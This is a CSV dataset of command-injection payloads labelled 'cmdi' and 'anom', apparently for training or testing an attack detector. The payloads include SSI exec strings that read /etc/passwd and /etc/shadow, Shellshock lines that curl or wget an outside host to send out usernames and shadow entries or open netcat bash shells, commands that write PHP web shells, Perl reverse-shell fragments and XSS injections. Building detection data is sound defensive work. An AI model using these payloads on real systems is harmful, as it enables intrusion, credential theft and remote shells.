payload,length,attack_type,label
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,59,cmdi,anom
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,59,cmdi,anom
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,43,cmdi,anom
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,43,cmdi,anom
/index.html|id|,15,cmdi,anom
;id;,4,cmdi,anom
;id,3,cmdi,anom
;netstat -a;,12,cmdi,anom
;system('cat%20/etc/passwd'),28,cmdi,anom
;id;,4,cmdi,anom
|id,3,cmdi,anom
|/usr/bin/id,12,cmdi,anom
|id|,4,cmdi,anom
|/usr/bin/id|,13,cmdi,anom
||/usr/bin/id|,14,cmdi,anom
|id;,4,cmdi,anom
||/usr/bin/id;,14,cmdi,anom
;id|,4,cmdi,anom
;|/usr/bin/id|,14,cmdi,anom
\n/bin/ls -al\n,15,cmdi,anom
\n/usr/bin/id\n,15,cmdi,anom
\nid\n,6,cmdi,anom
\n/usr/bin/id;,14,cmdi,anom
\nid;,5,cmdi,anom
\n/usr/bin/id|,14,cmdi,anom
\nid|,5,cmdi,anom
;/usr/bin/id\n,14,cmdi,anom
;id\n,5,cmdi,anom
|usr/bin/id\n,13,cmdi,anom
|nid\n,6,cmdi,anom
`id`,4,cmdi,anom
`/usr/bin/id`,13,cmdi,anom
a);id,5,cmdi,anom
a;id,4,cmdi,anom
a);id;,6,cmdi,anom
a;id;,5,cmdi,anom
a);id|,6,cmdi,anom
a;id|,5,cmdi,anom
a)|id,5,cmdi,anom
a|id,4,cmdi,anom
a)|id;,6,cmdi,anom
a|id,4,cmdi,anom
|/bin/ls -al,12,cmdi,anom
a);/usr/bin/id,14,cmdi,anom
a;/usr/bin/id,13,cmdi,anom
a);/usr/bin/id;,15,cmdi,anom
a;/usr/bin/id;,14,cmdi,anom
a);/usr/bin/id|,15,cmdi,anom
a;/usr/bin/id|,14,cmdi,anom
a)|/usr/bin/id,14,cmdi,anom
a|/usr/bin/id,13,cmdi,anom
a)|/usr/bin/id;,15,cmdi,anom
a|/usr/bin/id,13,cmdi,anom
;system('cat%20/etc/passwd'),28,cmdi,anom
;system('id'),13,cmdi,anom
;system('/usr/bin/id'),22,cmdi,anom
%0Acat%20/etc/passwd,20,cmdi,anom
%0A/usr/bin/id,14,cmdi,anom
%0Aid,5,cmdi,anom
%0A/usr/bin/id%0A,17,cmdi,anom
%0Aid%0A,8,cmdi,anom
& ping -i 30 127.0.0.1 &,24,cmdi,anom
& ping -n 30 127.0.0.1 &,24,cmdi,anom
%0a ping -i 30 127.0.0.1 %0a,28,cmdi,anom
`ping 127.0.0.1`,16,cmdi,anom
| id,4,cmdi,anom
& id,4,cmdi,anom
; id,4,cmdi,anom
%0a id %0a,10,cmdi,anom
`id`,4,cmdi,anom
$;/usr/bin/id,13,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",99,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",95,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",116,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",102,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",120,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",122,cmdi,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",82,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",102,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",53,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",102,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",53,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",102,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",102,cmdi,anom
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",53,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",99,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",95,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",116,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",102,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",120,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",122,cmdi,anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",82,cmdi,anom
cat /etc/hosts,14,cmdi,anom
$(`cat /etc/passwd`),20,cmdi,anom
cat /etc/passwd,15,cmdi,anom
%0Acat%20/etc/passwd,20,cmdi,anom
"{{ get_user_file(""/etc/passwd"") }}",34,cmdi,anom
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",39,cmdi,anom
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",39,cmdi,anom
"<!--#exec cmd=""/usr/bin/id;-->",30,cmdi,anom
system('cat /etc/passwd');,26,cmdi,anom
"<?php system(""cat /etc/passwd"");?>",34,cmdi,anom
`,1,cmdi,anom
|| ,3,cmdi,anom
| ,2,cmdi,anom
; ,2,cmdi,anom
',1,cmdi,anom
"'""",2,cmdi,anom
"
'",3,cmdi,anom
& ,2,cmdi,anom
&& ,3,cmdi,anom
%0a,3,cmdi,anom
%0a%0d,6,cmdi,anom
,0,cmdi,anom
%0Aid,5,cmdi,anom
%0a id %0a,10,cmdi,anom
%0Aid%0A,8,cmdi,anom
%0a ping -i 30 127.0.0.1 %0a,28,cmdi,anom
%0A/usr/bin/id,14,cmdi,anom
%0A/usr/bin/id%0A,17,cmdi,anom
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",117,cmdi,anom
%20{${phpinfo()}},17,cmdi,anom
%20{${sleep(20)}},17,cmdi,anom
%20{${sleep(3)}},16,cmdi,anom
a|id|,5,cmdi,anom
a;id|,5,cmdi,anom
a;id;,5,cmdi,anom
a;id\n,6,cmdi,anom
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,68,cmdi,anom
| curl http://crowdshield.com/.testing/rce.txt,46,cmdi,anom
& curl http://crowdshield.com/.testing/rce.txt,46,cmdi,anom
; curl https://crowdshield.com/.testing/rce_vuln.txt,52,cmdi,anom
&& curl https://crowdshield.com/.testing/rce_vuln.txt,53,cmdi,anom
curl https://crowdshield.com/.testing/rce_vuln.txt,50,cmdi,anom
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",271,cmdi,anom
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",270,cmdi,anom
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),69,cmdi,anom
dir,3,cmdi,anom
| dir,5,cmdi,anom
; dir,5,cmdi,anom
$(`dir`),8,cmdi,anom
& dir,5,cmdi,anom
&&dir,5,cmdi,anom
&& dir,6,cmdi,anom
| dir C:\,9,cmdi,anom
; dir C:\,9,cmdi,anom
& dir C:\,9,cmdi,anom
&& dir C:\,10,cmdi,anom
dir C:\,7,cmdi,anom
| dir C:\Documents and Settings\*,33,cmdi,anom
; dir C:\Documents and Settings\*,33,cmdi,anom
& dir C:\Documents and Settings\*,33,cmdi,anom
&& dir C:\Documents and Settings\*,34,cmdi,anom
dir C:\Documents and Settings\*,31,cmdi,anom
| dir C:\Users,14,cmdi,anom
; dir C:\Users,14,cmdi,anom
& dir C:\Users,14,cmdi,anom
&& dir C:\Users,15,cmdi,anom
dir C:\Users,12,cmdi,anom
;echo%20'<script>alert(1)</script>',35,cmdi,anom
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,110,cmdi,anom
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",51,cmdi,anom
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",51,cmdi,anom
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",51,cmdi,anom
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",52,cmdi,anom
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",49,cmdi,anom
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",56,cmdi,anom
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",56,cmdi,anom
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",56,cmdi,anom
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",57,cmdi,anom
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",53,cmdi,anom
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",49,cmdi,anom
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",49,cmdi,anom
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",49,cmdi,anom
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",50,cmdi,anom
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",47,cmdi,anom
;echo '<script>alert(1)</script>',33,cmdi,anom
echo '<script>alert(1)</script>'// XXXXXXXXXXX,46,cmdi,anom
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,82,cmdi,anom
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",54,cmdi,anom
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",54,cmdi,anom
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",54,cmdi,anom
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",55,cmdi,anom
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",52,cmdi,anom
() { :;}; echo vulnerable 10,28,cmdi,anom
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1513,cmdi,anom
eval('ls'),10,cmdi,anom
eval('pwd'),11,cmdi,anom
eval('pwd');,12,cmdi,anom
eval('sleep 5'),15,cmdi,anom
eval('sleep 5');,16,cmdi,anom
eval('whoami'),14,cmdi,anom
eval('whoami');,15,cmdi,anom
